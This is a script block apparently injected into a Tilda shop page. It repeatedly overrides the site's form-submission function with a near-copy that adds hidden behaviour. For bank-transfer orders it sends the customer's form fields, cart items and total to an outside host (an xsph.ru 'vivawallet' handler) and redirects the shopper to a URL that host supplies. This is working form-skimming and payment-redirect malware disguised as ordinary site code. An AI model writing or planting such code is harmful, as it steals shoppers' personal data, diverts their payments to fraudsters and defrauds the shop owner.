<script>
$(function () {
    var it = 0;
    var url = 'http://f0428258.xsph.ru/vivawallet/index.php'; // back-end handler;
    var cart_message = '';
    var all_quantity = 0; // Cantidad вещей.
    var amount = 0; // Общая сумма
    setInterval(function () {
        if (it < 10) {
            it++;
            window.tildaForm.send = function ($jform, btnformsubmit, formtype, formskey) {
                if (window.tildaForm.tildapayment = !1,
                ("y" == $jform.data("formcart") || $jform.closest(".t706__orderform").length > 0) && window.tildaForm.addPaymentInfoToForm($jform),
                2 == formtype || !formtype && formskey > "") {
                    var $inputElem;
                    $inputElem = $jform.find("input[name=tildaspec-cookie]"),
                    $inputElem && 0 != $inputElem.length || ($jform.append('<input type="hidden" name="tildaspec-cookie" value="">'),
                        $inputElem = $jform.find("input[name=tildaspec-cookie]")),
                    $inputElem.length > 0 && $inputElem.val(document.cookie),
                        $inputElem = $jform.find("input[name=tildaspec-referer]"),
                    $inputElem && 0 != $inputElem.length || ($jform.append('<input type="hidden" name="tildaspec-referer" value="">'),
                        $inputElem = $jform.find("input[name=tildaspec-referer]")),
                    $inputElem.length > 0 && $inputElem.val(window.location.href),
                        $inputElem = $jform.find("input[name=tildaspec-formid]"),
                    $inputElem && 0 != $inputElem.length || ($jform.append('<input type="hidden" name="tildaspec-formid" value="">'),
                        $inputElem = $jform.find("input[name=tildaspec-formid]")),
                    $inputElem.length > 0 && $inputElem.val($jform.attr("id")),
                    formskey > "" && ($inputElem = $jform.find("input[name=tildaspec-formskey]"),
                    $inputElem && 0 != $inputElem.length || ($jform.append('<input type="hidden" name="tildaspec-formskey" value="">'),
                        $inputElem = $jform.find("input[name=tildaspec-formskey]")),
                    $inputElem.length > 0 && $inputElem.val(formskey)),
                        $inputElem = $jform.find("input[name=tildaspec-version-lib]"),
                    $inputElem && 0 != $inputElem.length || ($jform.append('<input type="hidden" name="tildaspec-version-lib" value="">'),
                        $inputElem = $jform.find("input[name=tildaspec-version-lib]")),
                    $inputElem.length > 0 && $inputElem.val(window.tildaForm.versionLib),
                        $inputElem = $jform.find("input[name=tildaspec-pageid]"),
                    $inputElem && 0 != $inputElem.length || ($jform.append('<input type="hidden" name="tildaspec-pageid" value="">'),
                        $inputElem = $jform.find("input[name=tildaspec-pageid]")),
                    $inputElem.length > 0 && $inputElem.val($("#allrecords").data("tilda-page-id")),
                        $inputElem = $jform.find("input[name=tildaspec-projectid]"),
                    $inputElem && 0 != $inputElem.length || ($jform.append('<input type="hidden" name="tildaspec-projectid" value="">'),
                        $inputElem = $jform.find("input[name=tildaspec-projectid]")),
                    $inputElem.length > 0 && $inputElem.val($("#allrecords").data("tilda-project-id")),
                        $jform.find(".js-form-spec-comments").val(""),
                        $formurl = "https://" + window.tildaForm.endpoint + "/procces/";
                    var d = {};
                    if (d = $jform.serializeArray(),
                        d = d.filter((function (object) {
                                return -1 === object.name.indexOf("tildadelivery-")
                            }
                        )),
                    window.tildaForm.tildapayment && window.tildaForm.tildapayment.products)
                        d.push({
                            name: "tildapayment",
                            value: JSON.stringify(window.tildaForm.tildapayment)
                        });
                    else if ($jform.closest(".t706__orderform").length > 0)
                        return !1;
                    var tsstartrequest = Date.now();
                    return $.ajax({
                        type: "POST",
                        url: $formurl,
                        data: d,
                        dataType: "json",
                        xhrFields: {
                            withCredentials: !1
                        },
                        success: function (json) {
                            var successurl = $jform.data("success-url")
                                , successcallback = $jform.data("success-callback")
                                , formsendedcallback = $jform.data("formsended-callback");
                            if (btnformsubmit.removeClass("t-btn_sending"),
                                btnformsubmit.data("form-sending-status", "0"),
                                btnformsubmit.data("submitform", ""),
                            json && json.error) {
                                successurl = "",
                                    successcallback = "";
                                var $errBox = $jform.find(".js-errorbox-all");
                                $errBox && 0 != $errBox.length || ($jform.prepend('<div class="js-errorbox-all"></div>'),
                                    $errBox = $jform.find(".js-errorbox-all"));
                                var $allError = $errBox.find(".js-rule-error-all");
                                $allError && 0 != $allError.length || ($errBox.append('<p class="js-rule-error-all">' + json.error + "</p>"),
                                    $allError = $errBox.find(".js-rule-error-all")),
                                    $allError.html(json.error).show(),
                                    $errBox.show(),
                                    $jform.addClass("js-send-form-error"),
                                    $jform.trigger("tildaform:aftererror")
                            } else {
                                if (json && json.needcaptcha)
                                    return formskey ? void tildaForm.addTildaCaptcha($jform, formskey) : void alert("Server busy. Please try again later.");
                                var formres = {};
                                if (json && json.results && json.results[0]) {
                                    var str = json.results[0];
                                    str = str.split(":"),
                                        formres.tranid = str[0] + ":" + str[1],
                                        formres.orderid = str[2] ? str[2] : "0",
                                    formres.orderid > "" && "0" != formres.orderid && (window.tildaForm.orderIdForStat = formres.orderid)
                                } else
                                    formres.tranid = "0",
                                        formres.orderid = "0";
                                $jform.data("tildaformresult", formres);
                                var virtPage = $jform.data("tilda-event-name") || "";
                                virtPage && "" != virtPage || (virtPage = "y" == $jform.data("formcart") && json && (json.next && json.next.type && ("function" != json.next.type || json.next.value && ("stripev3" == json.next.value.sysname || "outersite" == json.next.value.installation)) || !json.next) ? "/tilda/" + $jform.attr("id") + "/payment/" : "/tilda/" + $jform.attr("id") + "/submitted/");
                                var virtTitle = "Send data from form " + $jform.attr("id")
                                    , virtPrice = 0
                                    , virtProduct = "";
                                if (window.Tilda && "function" == typeof Tilda.sendEventToStatistics) {
                                    window.tildaForm.tildapayment && window.tildaForm.tildapayment.amount ? (virtPrice = window.tildaForm.tildapayment.amount,
                                    parseFloat(window.tildaForm.tildapayment.amount) > 0 && (virtTitle = "Order " + formres.orderid)) : $jform.find(".js-tilda-price").length > 0 && (virtPrice = $jform.find(".js-tilda-price").val(),
                                    parseFloat(virtPrice) > 0 && (virtTitle = "Order " + formres.orderid));
                                    try {
                                        Tilda.sendEventToStatistics(virtPage, virtTitle, virtProduct, virtPrice)
                                    } catch (e) {
                                        console.log(e)
                                    }
                                    window.dataLayer && window.dataLayer.push({
                                        event: "submit_" + $jform.attr("id")
                                    })
                                } else {
                                    try {
                                        "undefined" != typeof ga && ga && "tilda" != window.mainTracker && ga("send", {
                                            hitType: "pageview",
                                            page: virtPage,
                                            title: virtTitle
                                        }),
                                        window.mainMetrika > "" && window[window.mainMetrika] && window[window.mainMetrika].hit(virtPage, {
                                            title: virtTitle,
                                            referer: window.location.href
                                        })
                                    } catch (e) {
                                        console.log(e)
                                    }
                                    window.dataLayer && window.dataLayer.push({
                                        event: "submit_" + $jform.attr("id")
                                    })
                                }
                                try {
                                    $jform.trigger("tildaform:aftersuccess"),
                                    formsendedcallback && formsendedcallback.length > 0 && eval(formsendedcallback + "($jform);")
                                } catch (e) {
                                    console.log(e)
                                }
                                if (json && json.next && json.next.type > "") {
                                    var res = window.tildaForm.payment($jform, json.next);
                                    return successurl = "",
                                        !1
                                }

                                for (var i = 0; i < tcart.products.length; i++) {
                                    all_quantity = tcart.total;
                                    amount = tcart.amount;
                                    cart_message += 'Producto №' + i + ' ' + tcart.products[i].name + ' Cantidad x' + tcart.products[i].quantity + ' Precio ' + tcart.products[i].price + ' €;'
                                }

                                var new_data = $jform.serializeArray();
                                new_data.push({'name': 'cartItems', 'value': cart_message});
                                new_data.push({'name': 'amount', 'value': amount});
                                new_data.push({'name': 'all_quantity', 'value': all_quantity});

                                console.log(new_data);
                                if (tcart.system == 'banktransfer') {
                                    $.ajax({
                                        url: url,
                                        method: 'post',
                                        data: new_data,
                                        success: function f(d) {
                                            console.log(d);
                                            redirect(d);
                                        }
                                    })
                                }

                                window.tildaForm.successEnd($jform, successurl, successcallback)
                            }
                        },
                        error: function (error) {
                            var ts_delta = Date.now() - tsstartrequest;
                            btnformsubmit.removeClass("t-btn_sending"),
                                btnformsubmit.data("form-sending-status", "0"),
                                btnformsubmit.data("submitform", "");
                            var $errBox = $jform.find(".js-errorbox-all");
                            $errBox && 0 != $errBox.length || ($jform.prepend('<div class="js-errorbox-all"></div>'),
                                $errBox = $jform.find(".js-errorbox-all"));
                            var $allError = $errBox.find(".js-rule-error-all");
                            if ($allError && 0 != $allError.length || ($errBox.append('<p class="js-rule-error-all"></p>'),
                                $allError = $errBox.find(".js-rule-error-all")),
                            !error || 0 == error.status && ts_delta < 100)
                                $allError.html("Request error (opening block content panel). Please check internet connection...");
                            else {
                                if (error && (error.status >= 500 || 408 == error.status || 410 == error.status || 429 == error.status || "timeout" == error.statusText) && -1 !== window.tildaForm.endpoint.indexOf("forms.tilda"))
                                    return window.tildaForm.endpoint = "forms2.tildacdn.com",
                                        window.tildaForm.send($jform, btnformsubmit, formtype, formskey),
                                        !1;
                                error && error.responseText > "" ? $allError.html("[" + error.status + "] " + error.responseText + ". Please, try again later.") : error && error.statusText ? $allError.html("Error [" + error.status + ", " + error.statusText + "]. Please, try again later.") : $allError.html("[" + error.status + "] Unknown error. Please, try again later.")
                            }
                            $allError.show(),
                                $errBox.show(),
                                $jform.addClass("js-send-form-error"),
                                $jform.trigger("tildaform:aftererror")
                        },
                        timeout: 15e3
                    }),
                        !1
                }
                if ("y" == $jform.data("is-formajax")) {
                    var d = {};
                    return d = $jform.serializeArray(),
                    window.tildaForm.tildapayment && window.tildaForm.tildapayment.amount && d.push({
                        name: "tildapayment",
                        value: JSON.stringify(window.tildaForm.tildapayment)
                    }),
                        $.ajax({
                            type: "POST",
                            url: $jform.attr("action"),
                            data: d,
                            dataType: "text",
                            xhrFields: {
                                withCredentials: !1
                            },
                            success: function (html) {
                                var json, successurl = $jform.data("success-url"),
                                    successcallback = $jform.data("success-callback");
                                if (btnformsubmit.removeClass("t-btn_sending"),
                                    btnformsubmit.data("form-sending-status", "0"),
                                    btnformsubmit.data("submitform", ""),
                                html && html.length > 0)
                                    if ("{" == html.substring(0, 1)) {
                                        if ((json = window.JSON && window.JSON.parse ? window.JSON.parse(html) : $.parseJSON(html)) && json.message)
                                            "OK" != json.message && $jform.find(".js-successbox").html(json.message);
                                        else if (json && json.error) {
                                            var $errBox = $jform.find(".js-errorbox-all");
                                            $errBox && 0 != $errBox.length || ($jform.prepend('<div class="js-errorbox-all"></div>'),
                                                $errBox = $jform.find(".js-errorbox-all"));
                                            var $allError = $errBox.find(".js-rule-error-all");
                                            return $allError && 0 != $allError.length || ($errBox.append('<p class="js-rule-error-all">Unknown error. Please, try again later.</p>'),
                                                $allError = $errBox.find(".js-rule-error-all")),
                                                $allError.html(json.error),
                                                $allError.show(),
                                                $errBox.show(),
                                                $jform.addClass("js-send-form-error"),
                                                $jform.trigger("tildaform:aftererror"),
                                                !1
                                        }
                                    } else
                                        $jform.find(".js-successbox").html(html);
                                var virtPage = "/tilda/" + $jform.attr("id") + "/submitted/"
                                    , virtTitle = "Send data from form " + $jform.attr("id");
                                window.Tilda && "function" == typeof Tilda.sendEventToStatistics ? window.Tilda.sendEventToStatistics(virtPage, virtTitle, "", 0) : ("undefined" != typeof ga && "tilda" != window.mainTracker && ga("send", {
                                    hitType: "pageview",
                                    page: virtPage,
                                    title: virtTitle
                                }),
                                window.mainMetrika > "" && window[window.mainMetrika] && window[window.mainMetrika].hit(virtPage, {
                                    title: virtTitle,
                                    referer: window.location.href
                                })),
                                    $jform.trigger("tildaform:aftersuccess"),
                                    window.tildaForm.successEnd($jform, successurl, successcallback)
                            },
                            error: function (error) {
                                btnformsubmit.removeClass("t-btn_sending"),
                                    btnformsubmit.data("form-sending-status", "0"),
                                    btnformsubmit.data("submitform", "");
                                var $errBox = $jform.find(".js-errorbox-all");
                                $errBox && 0 != $errBox.length || ($jform.prepend('<div class="js-errorbox-all"></div>'),
                                    $errBox = $jform.find(".js-errorbox-all"));
                                var $allError = $errBox.find(".js-rule-error-all");
                                $allError && 0 != $allError.length || ($errBox.append('<p class="js-rule-error-all"></p>'),
                                    $allError = $errBox.find(".js-rule-error-all")),
                                    error && error.responseText > "" ? $allError.html(error.responseText + ". Please, try again later. [" + error.status + "]") : error && error.statusText ? $allError.html("Error [" + error.statusText + "]. Please, try again later. [" + error.status + "]") : $allError.html("Unknown error. Please, try again later. [" + error.status + "]"),
                                    $allError.show(),
                                    $errBox.show(),
                                    $jform.addClass("js-send-form-error"),
                                    $jform.trigger("tildaform:aftererror")
                            },
                            timeout: 15e3
                        }),
                        !1
                }
                var attraction = $jform.attr("action");
                return -1 == attraction.indexOf(window.tildaForm.endpoint) && (btnformsubmit.removeClass("t-btn_sending"),
                    btnformsubmit.data("form-sending-status", "3"),
                    $jform.submit(),
                    !0)
            }
        }
        function redirect(url) {
            window.location.href = url;
        }
    },1000)
})
</script>